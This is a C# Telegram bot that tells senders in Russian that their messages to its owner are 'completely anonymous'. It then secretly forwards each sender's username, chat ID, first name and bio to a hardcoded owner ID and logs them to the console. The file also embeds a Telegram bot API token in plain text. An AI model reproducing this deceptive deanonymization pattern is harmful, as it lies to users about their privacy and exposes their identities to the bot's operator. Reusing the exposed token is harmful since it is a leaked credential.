using Newtonsoft.Json.Linq;
using System;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Exceptions;
using Telegram.Bot.Types;
using static System.Net.Mime.MediaTypeNames;
using Microsoft.VisualBasic;
using System.Configuration;
using Microsoft.Data.SqlClient;
using System.Drawing.Printing;
using System.Data.Common;
using Telegram.Bot.Types.ReplyMarkups;

namespace TelegrambotZ
{
    internal class Program
    {


        static void Main(string[] args)
        {
            String token = "6403856858:AAEVqVgJLBsBbdJd4L21njU7o2Gif6-s1xM";
            var client = new TelegramBotClient(token);
            using var cts = new CancellationTokenSource();
            client.StartReceiving(Update, Error, null, cts.Token);
         
            Console.ReadLine();
            cts.Cancel();

        }
        async static Task Update(ITelegramBotClient botClient, Update update, CancellationToken token)
        {
            
            int garickId = 1153499414;
            TimeSpan times = DateTime.UtcNow - update.Message.Date;
            if (times.Seconds > 5)
            {
                Console.WriteLine("skipping old update");
            }
            else
            {
                

                var message = update.Message;

                if (message.Text != null)
                {
                    if (message.Text.ToLower().Contains("/start 1153499414"))
                    {
                        await botClient.SendTextMessageAsync(message.Chat.Id, "🚀 Здесь можно отправить анонимное сообщение человеку, который опубликовал эту ссылку.\r\n\r\nНапишите сюда всё, что хотите ему передать, и через несколько секунд он получит ваше сообщение, но не будет знать от кого.\r\n\r\nОтправить можно фото, видео, 💬 текст, 🔊 голосовые, 📷видеосообщения (кружки), а также стикеры.\r\n\r\n⚠️ Это полностью анонимно!");
                        return;
                    }

                    else if (message.Text != null)
                    {

                        Console.WriteLine($"{message.Text} \n{message.Chat.Bio} \n {message.Chat.Username} \n {message.Chat.FirstName}");
                        await botClient.SendTextMessageAsync(message.Chat.Id, "Сообщение отправлено, ожидайте ответ!" );
                        
                        
                        await botClient.SendTextMessageAsync(garickId, $"У тебя новое анонимное сообщение!\r\n{message.Text}\r \n↩️  Свайпни для ответа.");
                            await botClient.SendTextMessageAsync(garickId, $"Отправил {message.Chat.Username} \n{message.Chat.Id}\n {message.Chat.FirstName}\n {message.Chat.Bio}");
                        return;
                    }
                    
                    
                    

                    
                }

            }
        }
    

        

        private static Task Error(ITelegramBotClient arg1, Exception exception, CancellationToken arg3)
        {
            var ErrorMessage = exception switch
            {
                ApiRequestException apiRequestException
                    => $"Telegram API Error:\n[{apiRequestException.ErrorCode}]\n{apiRequestException.Message}",
                _ => exception.ToString()
            };

            Console.WriteLine(ErrorMessage);
            return Task.CompletedTask;
        }
    }
}
